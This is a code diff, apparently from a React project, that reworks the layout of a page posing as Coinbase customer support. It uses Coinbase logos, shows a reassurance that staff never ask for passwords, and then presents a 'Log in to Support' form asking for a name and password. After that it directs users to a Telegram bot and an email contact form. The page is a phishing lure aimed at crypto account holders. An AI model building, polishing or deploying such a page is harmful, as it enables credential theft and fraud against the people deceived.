@@ -40,72 +40,79 @@ function App() {
   };
 
   return (
-    <div style={header}><img src="/coinbase-logo-box.jpg" alt="Coinbase top left" style={logoTopLeft} /></div>
-<div style={wrapper}>
-      {!showLogin ? (
-        <>
-          <h1 style={{ fontSize: 28, marginBottom: 10 }}>Find answers to your questions</h1>
-          <p style={{ color: "#cbd5e1", marginBottom: 30 }}>Search help topics or browse categories below.</p>
+    <div>
+      <div style={header}>
+        <img src="/coinbase-logo.jpg" alt="Coinbase" style={logoTopLeft} />
+      </div>
 
-          <div style={catRow}>
-            {categories.map((cat, i) => (
-              <div key={i} style={catCard} onClick={() => toggleCategory(i)}>
-                <div style={{ fontSize: 24 }}>{cat.icon}</div>
-                <div style={{ fontSize: 14, fontWeight: 600 }}>{cat.title}</div>
-                {openCategory === i && (
-                  <div style={{ marginTop: 8, color: "#cbd5e1", fontSize: 12 }}>{cat.answer}</div>
-                )}
-              </div>
-            ))}
-          </div>
+      <div style={wrapper}>
+        {!showLogin ? (
+          <>
+            <h1 style={{ fontSize: 28, marginBottom: 10 }}>Find answers to your questions</h1>
+            <p style={{ color: "#cbd5e1", marginBottom: 30 }}>Search help topics or browse categories below.</p>
 
-          <div style={policyBox}>
-            <h3>Our support team will never ask for your password or 2-step verification codes.</h3>
-            <p>We’re here to help you stay safe and secure while using Coinbase.</p>
-          </div>
-
-          <button style={buttonStyle} onClick={() => setShowLogin(true)}>Sign in to speak with us</button>
-        </>
-      ) : !loggedIn ? (
-        <div style={centerScreen}>
-          <div style={box}>
-            <img
-              src="/coinbase-logo-box.jpg"
-              alt="Coinbase"
-              style={logoStyle}
-            />
-            <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
-            <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
-            <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
-            <button style={buttonStyle} onClick={handleLogin}>Log in</button>
-          </div>
-        </div>
-      ) : (
-        <div style={centerScreen}>
-          <div style={box}>
-            <img
-              src="/coinbase-logo-box.jpg"
-              alt="Coinbase"
-              style={logoStyle}
-            />
-            <h2 style={{ marginBottom: 20 }}>Welcome, {name}</h2>
-            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "12px" }}>
-              <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
-                💬 Contact us via Telegram
-              </a>
-              <a href="#" style={chatButton}>💬 Live Chat</a>
+            <div style={catRow}>
+              {categories.map((cat, i) => (
+                <div key={i} style={catCard} onClick={() => toggleCategory(i)}>
+                  <div style={{ fontSize: 24 }}>{cat.icon}</div>
+                  <div style={{ fontSize: 14, fontWeight: 600 }}>{cat.title}</div>
+                  {openCategory === i && (
+                    <div style={{ marginTop: 8, color: "#cbd5e1", fontSize: 12 }}>{cat.answer}</div>
+                  )}
+                </div>
+              ))}
             </div>
-            <p style={{ marginTop: 30 }}>Or send us a message via email:</p>
-            <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
-            <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
-            <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
-            {sent && <p style={{ color: "lightgreen" }}>✅ Message sent!</p>}
+
+            <div style={policyBox}>
+              <h3>Our support team will never ask for your password or 2-step verification codes.</h3>
+              <p>We’re here to help you stay safe and secure while using Coinbase.</p>
+            </div>
+
+            <button style={buttonStyle} onClick={() => setShowLogin(true)}>Sign in to speak with us</button>
+          </>
+        ) : !loggedIn ? (
+          <div style={centerScreen}>
+            <div style={box}>
+              <img src="/coinbase-logo-box.jpg" alt="Coinbase Centered" style={logoStyle} />
+              <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
+              <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
+              <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
+              <button style={buttonStyle} onClick={handleLogin}>Log in</button>
+            </div>
           </div>
-        </div>
-      )}
+        ) : (
+          <div style={centerScreen}>
+            <div style={box}>
+              <img src="/coinbase-logo-box.jpg" alt="Coinbase Centered" style={logoStyle} />
+              <h2 style={{ marginBottom: 20 }}>Welcome, {name}</h2>
+              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "12px" }}>
+                <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
+                  💬 Contact us via Telegram
+                </a>
+                <a href="#" style={chatButton}>💬 Live Chat</a>
+              </div>
+              <p style={{ marginTop: 30 }}>Or send us a message via email:</p>
+              <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
+              <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
+              <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
+              {sent && <p style={{ color: "lightgreen" }}>✅ Message sent!</p>}
+            </div>
+          </div>
+        )}
+      </div>
     </div>
   );
 }
+
+const header = {
+  width: "100%",
+  padding: "12px 20px",
+  background: "#0a0f1c"
+};
+
+const logoTopLeft = {
+  height: "32px"
+};
 
 const wrapper = {
   maxWidth: 1000,
@@ -123,8 +130,8 @@ const centerScreen = {
 };
 
 const logoStyle = {
-  height: "28px",
-  marginBottom: "16px"
+  height: "60px",
+  marginBottom: "20px"
 };
 
 const catRow = {
@@ -203,14 +210,3 @@ const linkButton = {
 };
 
 ReactDOM.createRoot(document.getElementById("root")).render(<App />);
-
-
-const header = {
-  width: "100%",
-  padding: "12px 20px",
-  background: "#0a0f1c"
-};
-
-const logoTopLeft = {
-  height: "32px"
-};
